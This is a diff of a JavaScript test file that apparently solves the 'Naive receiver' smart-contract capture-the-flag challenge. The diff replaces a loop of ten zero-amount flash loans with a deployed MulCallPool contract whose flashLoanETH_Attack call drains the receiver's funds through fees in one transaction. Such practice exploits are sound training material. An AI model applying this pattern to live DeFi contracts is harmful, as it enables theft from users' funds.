@@ -1,5 +1,6 @@
 const { ethers } = require("hardhat");
 const { expect } = require("chai");
+const { poll } = require("ethers/lib/utils");
 
 describe("[Challenge] Naive receiver", function () {
   let deployer, user, player;
@@ -59,13 +60,24 @@ describe("[Challenge] Naive receiver", function () {
 
     // erveryone call pool.flashLoan user receiver pay fee
 
-    const ETH_address = await pool.ETH();
+    // 1: call 10 number
+
+    /*     const ETH_address = await pool.ETH();
 
     await pool.connect(player);
 
     for (let index = 0; index < 10; index++) {
       await pool.flashLoan(receiver.address, ETH_address, 0, "0x");
-    }
+    } */
+
+    // 2: call 1 number
+    const MulCallPoolFactory = await ethers.getContractFactory(
+      "MulCallPool",
+      player
+    );
+    const mulCallPool = await MulCallPoolFactory.deploy(pool.address);
+
+    await mulCallPool.flashLoanETH_Attack(receiver.address, 10, 0);
   });
 
   after(async function () {
